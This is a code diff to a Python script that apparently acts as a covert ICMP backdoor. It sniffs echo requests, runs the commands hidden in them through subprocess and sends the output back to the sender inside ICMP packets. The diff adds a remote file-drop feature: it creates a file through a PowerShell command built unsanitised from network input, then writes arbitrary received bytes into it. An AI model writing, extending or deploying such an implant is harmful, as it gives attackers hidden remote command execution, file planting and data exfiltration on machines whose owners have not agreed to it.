@@ -4,6 +4,10 @@ import threading
 import sys
 cmn_cmds = []
 verbose = False
+fname = ""
+"""This is the only way I can thing to pass a file name from one if to aother
+There might be a better way to accomplish this but this is the only way I can come up with at the current moment
+"""
 
 def cmd_mon(pkt):
     if str(pkt.getlayer(ICMP).type) == "8":
@@ -17,7 +21,7 @@ def cmd_mon(pkt):
 
 
 def cmd_proc(cmd, source):
-    global verbose
+    global verbose, fname
     prefix = cmd[0]
     term = cmd[1]
     cmd = cmd[3::]
@@ -42,6 +46,18 @@ def cmd_proc(cmd, source):
             send_output(result.stdout.decode(), source)
         elif term == "s":
             print("This taps into the stored commands")
+    elif prefix == "f":#This is only dealing local dir that the program is running in right now
+        if term == "1":
+            fname = cmd
+            sp.run(f"powershell New-Item -Path . -Name {cmd} -ItemType File" , capture_output=True)
+        elif term == "2":
+            with open(fname, "wb") as file:
+                file.write(cmd)
+                file.close()
+        else:
+            print("Something has gone horribly wrong")
+    else:
+        print("You shouldnt end up here")
 
 def send_output(stdout, sender):
     send(IP(dst=sender)/ICMP()/stdout)
